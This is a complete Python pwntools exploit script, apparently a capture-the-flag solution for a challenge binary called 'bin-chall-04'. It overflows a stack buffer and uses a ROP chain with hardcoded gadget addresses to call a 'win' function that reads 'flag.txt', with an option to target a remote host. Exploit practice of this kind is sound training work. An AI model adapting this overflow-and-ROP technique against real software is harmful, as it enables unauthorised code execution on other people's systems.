#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./bin-chall-04")


def start(argv=[], *a, **kw):
    host = args.HOST or 'localhost'
    port = int(args.PORT or 1337)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

writable = elf.bss(0x100)
win = elf.symbols["win"] + 28
pop_rdi = 0x4013d3
pop_rsi_r15 = 0x4013d1
flag_txt = next(elf.search(b"flag.txt\x00"))

pad = 0x20

payload = b"A" * pad
payload += flat(writable)  # rbp
payload += flat(pop_rsi_r15, 0, 0)
payload += flat(pop_rdi, flag_txt)
payload += flat(win)

io.sendafter(b"Input: ", payload)

io.interactive()
